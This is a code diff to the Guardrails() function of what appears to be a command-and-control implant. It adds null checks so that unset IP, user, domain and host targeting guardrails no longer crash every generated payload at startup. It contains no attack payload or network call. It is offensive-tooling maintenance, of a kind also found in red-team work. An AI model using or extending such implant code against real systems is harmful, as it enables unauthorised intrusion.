@@ -369,10 +369,18 @@ auto DECLFN Guardrails( VOID ) -> BOOL {
     CHAR* DomainGuard = KH_GUARDRAILS_DOMAIN;
     CHAR* HostGuard   = KH_GUARDRAILS_HOST;
 
-    INT32 IpFlag     = Str::LengthA( IpGuard    );
-    INT32 UserFlag   = Str::LengthA( UserGuard   );
-    INT32 DomainFlag = Str::LengthA( DomainGuard );
-    INT32 HostFlag   = Str::LengthA( HostGuard   );
+    // Each guardrail must be tested before it is measured.  A guardrail that
+    // was not compiled in is the literal `nullptr` -- Defines.h defaults all
+    // four that way, and nothing in the build ever defines them -- and
+    // LengthA( nullptr ) is a read of address 0.  clang can see the pointer is
+    // a constant null, so it folds the string base away entirely and emits a
+    // scan straight from address 0; the fault lands on the first instruction
+    // of that scan.  Main() calls Guardrails() before it does anything else,
+    // so that fault was the first thing every generated payload did.
+    INT32 IpFlag     = IpGuard     ? ( INT32 )Str::LengthA( IpGuard     ) : 0;
+    INT32 UserFlag   = UserGuard   ? ( INT32 )Str::LengthA( UserGuard   ) : 0;
+    INT32 DomainFlag = DomainGuard ? ( INT32 )Str::LengthA( DomainGuard ) : 0;
+    INT32 HostFlag   = HostGuard   ? ( INT32 )Str::LengthA( HostGuard   ) : 0;
 
     if ( 
         ! IpFlag     &&
